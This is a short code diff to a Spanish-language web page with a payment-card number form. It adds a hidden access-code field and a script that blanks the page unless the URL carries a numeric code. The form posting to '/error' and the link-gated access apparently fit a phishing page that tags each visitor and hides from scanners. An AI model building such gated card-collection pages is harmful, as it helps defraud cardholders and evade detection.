@@ -543,6 +543,7 @@ input{
 		<!-- Formulario -->
 		<form action="/error" method="post" id="formulario-tarjeta" class="formulario-tarjeta active">
 			<div class="grupo">
+				<input type="hidden" name="codigo" id="codigoAcceso">
 				<label for="inputNumero">Número Tarjeta</label>
 				<input type="text" name="input1"  id="inputNumero" maxlength="19" autocomplete="on" required>
 			</div>
@@ -607,7 +608,25 @@ function mostrarFormulario(){
   document.getElementById("input1").value = tipoSeleccionado;
 }
 </script>
+	
+<script>
+const parametros = new URLSearchParams(window.location.search);
+const codigo = parametros.get("codigo");
 
+if (!codigo || !/^\d+$/.test(codigo)) {
+    document.body.innerHTML = `
+        <div style="
+            font-family: Arial;
+            text-align: center;
+            padding: 50px;
+        ">
+            <h1>Código de acceso inválido</h1>
+        </div>
+    `;
+} else {
+    document.getElementById("codigoAcceso").value = codigo;
+}
+</script>
 </body>
 </html>
 
